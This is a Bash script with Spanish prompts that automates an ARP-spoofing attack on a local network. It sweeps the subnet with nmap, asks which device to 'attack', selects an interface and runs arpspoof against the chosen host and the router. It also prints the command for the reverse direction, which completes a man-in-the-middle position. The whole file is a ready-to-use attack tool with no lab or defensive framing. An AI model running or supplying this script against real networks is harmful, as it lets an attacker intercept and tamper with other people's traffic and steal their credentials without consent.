#!/usr/bin/env bash
set -euo pipefail

ip="$(hostname -I | awk '{print $1}')"
echo "dependencias necesarias: (nmap y dsniff) si no lo tienes instalado, instálalo con: sudo apt install nmap dsniff"
echo "Se escaneará por defecto en /24."
while true; do
    read -p "¿Desea ese rango? (s/n): " respuesta_rango
    respuesta_rango="${respuesta_rango,,}"
    if [[ $respuesta_rango == "s" ]]; then
        rango="${ip%.*}.0/24"
        break
    elif [[ $respuesta_rango == "n" ]]; then
        while true; do
            read -p "Ingrese el prefijo CIDR deseado (0-32, por ejemplo 24): " rango_deseado
            if [[ $rango_deseado =~ ^([0-9]|[12][0-9]|3[0-2])$ ]]; then
                rango="${ip%.*}.0/${rango_deseado}"
                break
            else
                echo "Prefijo inválido. Debe ser un número entre 0 y 32."
            fi
        done
        break
    else
        echo "Respuesta no válida."
    fi
done
echo -e "\e[31mcuando termine de escanear presione ENTER...\e[0m"
echo "Escaneando en el rango: $rango"
sudo nmap -sn "$rango"
read -p ""
read -p "que dispositivo desea atacar (ingrese el host ID de la ip): " host_id
ip_objetivo="${ip%.*}.$host_id"
echo "el objetivo sera: $ip_objetivo"
interfaz_red_defecto=$(ip -o addr show | grep "$ip" | awk '{print $2}')
read -p "ingrese la interfaz de red a usar  (1-por defecto:$interfaz_red_defecto/2-manual) (1-2)" pregunta_interfaz
    if [[ $pregunta_interfaz == "1" ]]; then
        interfaz_red="$interfaz_red_defecto"
    elif [[ $pregunta_interfaz == "2" ]]; then
        read -p "ingrese la interfaz de red a usar (ejemplo: eth0, wlan0): " interfaz_red
    else
        echo "Opción no válida. Usando la interfaz por defecto: $interfaz_red_defecto"
        interfaz_red="$interfaz_red_defecto"
    fi
router="${ip%.*}.1"
echo "realizando ataque unidireccional si usted quiere un ataque bidireccional para mayor efectividad ejecute (sudo arpspoof -i interfaz_red -t $router $ip_objetivo) con la dependencia dsniff"
sudo arpspoof -i $interfaz_red -t $ip_objetivo $router
